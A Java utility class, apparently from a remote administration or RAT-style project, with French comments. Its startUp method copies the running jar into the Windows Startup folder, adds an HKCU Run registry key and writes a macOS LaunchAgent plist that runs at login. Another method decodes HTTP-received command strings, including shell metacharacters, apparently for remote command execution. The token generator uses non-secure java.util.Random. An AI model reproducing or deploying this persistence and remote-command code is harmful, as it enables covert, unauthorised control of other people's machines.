package fr.kaotic.func;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.sql.Driver;
import java.util.Random;

import fr.kaotic.utils.WinRegistry;

public class utilsFunction {
	static final String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	static SecureRandom random = new SecureRandom();
	
	public static void startUp(String fname) throws IllegalArgumentException, IllegalAccessException, InvocationTargetException, IOException{
		System.out.print(Driver.class.getProtectionDomain().getCodeSource().getLocation().toString().substring(6));

		osFunction osF = new osFunction();
		int systemType = osF.getOS();
		
		System.out.println("Nom de l'OS: " + systemType);
		File file = new File(Driver.class.getProtectionDomain().getCodeSource().getLocation().toString().substring(6));
		String currentJar = file.getAbsolutePath();
		if (file.isFile()){
			if(systemType == 1){
				
				String location = "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+fname;
				location = System.getenv("AppData") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+ fname;
	
				System.out.println(location);
	
				overWrite(location, file);
				String javaHome = System.getProperty("java.home") + "\\bin\\javaw.exe";
				
				try {
					WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", fname);
				} catch (Exception ex) {
				}
				WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", fname, "\"" + javaHome + "\" -jar \"" + currentJar + "\"");
				
			}else if (systemType == 2) {
				// Démarrage auto OSX: http://stackoverflow.com/questions/6442364/running-script-upon-login-mac
				File sFile = new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + new File(currentJar).getName().replace(".jar", ".plist"));
				PrintWriter out = new PrintWriter(new FileWriter(sFile));
				out.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
				out.println("<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
				out.println("<plist version=\"1.0\">");
				out.println("<dict>");
				out.println("   <key>Label</key>");
				out.println("   <string>" + currentJar.replace("file:", "").replace(".jar", "") + "</string>");
				out.println("   <key>ProgramArguments</key>");
				out.println("   <array>");
				out.println("      <string>" + System.getProperty("java.home").replace(" ", "%20") + System.getProperty("file.separator") + "bin" + System.getProperty("file.separator") + "java</string>");
				out.println("      <string>-jar</string>");
				out.println("      <string>" + currentJar.replace("file:", "") + "</string>");
				out.println("   </array>");
				out.println("   <key>RunAtLoad</key>");
				out.println("   <true/>");
				out.println("</dict>");
				out.println("</plist>");
				out.close();
			}
		}
		
	}

	private static void overWrite(String filename, File file) {
		FileInputStream fin = null;

		try {
			fin = new FileInputStream(file);
			byte fileContent[] = new byte[(int)file.length()];

			fin.read(fileContent);

			String s = new String(fileContent);
			genFile(filename,s.getBytes());
			
		}
		catch (FileNotFoundException e) {
			System.out.println("Fichier non trouvé " + e);
		}
		catch (IOException ioe) {
			System.out.println("Exception pendant la lecture du fichier " + ioe);
		}
		finally {
			try {
				if (fin != null) {
					fin.close();
				}
			}
			catch (IOException ioe) {
				System.out.println("Erreur durant le fermeture du stream " + ioe);
			}

		}
	}

	private static void genFile(String fileName, byte[] fileBytes) {
		try{
			FileWriter fileOut = new FileWriter(new File(fileName));
			String bytes = new String(fileBytes);
			fileOut.write(bytes);
			fileOut.close();
		}catch(IOException e){
			System.out.println("Erreur I/O " + e);
		}
	}
	
	public static String pHTTPCommand(String command){
		
		command = command.replaceAll("\\+", " ")
        .replaceAll("%3A",":")
        .replaceAll("%5C", "\\\\")
        .replaceAll("%7C", "|")
        .replaceAll("%3F", "?")
        .replaceAll("%3B", ";")
        .replaceAll("%2C", ",")
        .replaceAll("%25", "%")
        .replaceAll("%5E", "^")
        .replaceAll("%24", "\\$")
        .replaceAll("%22", "\"")
        .replaceAll("%27", "'")
        .replaceAll("%7E", "~")
        .replaceAll("%26", "&")
        .replaceAll("%23", "#")
        .replaceAll("%60", "`")
        .replaceAll("%28", "(")
        .replaceAll("%29", ")")
        .replaceAll("%2F", "/");
		
		return command;
		
	}
	public static String sha1Encrypt(String input) throws NoSuchAlgorithmException {
		
        MessageDigest mDigest = MessageDigest.getInstance("SHA1");
        byte[] result = mDigest.digest(input.getBytes());
        StringBuffer sb = new StringBuffer();
        
        for (int i = 0; i < result.length; i++) {
            sb.append(Integer.toString((result[i] & 0xff) + 0x100, 16).substring(1));
        }
         
        return sb.toString();
    }
	public static synchronized String tokenGenerate(Integer length){		
	    byte random[] = new byte[length];
	    Random randomGenerator = new Random();
	    StringBuffer buffer = new StringBuffer();

	    randomGenerator.nextBytes(random);

	    for (int j = 0; j < random.length; j++) {
	        byte b1 = (byte) ((random[j] & 0xf0) >> 4);
	        byte b2 = (byte) (random[j] & 0x0f);
	        if (b1 < 10)
	            buffer.append((char) ('0' + b1));
	        else
	            buffer.append((char) ('A' + (b1 - 10)));
	        if (b2 < 10)
	            buffer.append((char) ('0' + b2));
	        else
	            buffer.append((char) ('A' + (b2 - 10)));
	    }
	    return (buffer.toString());
	}
}
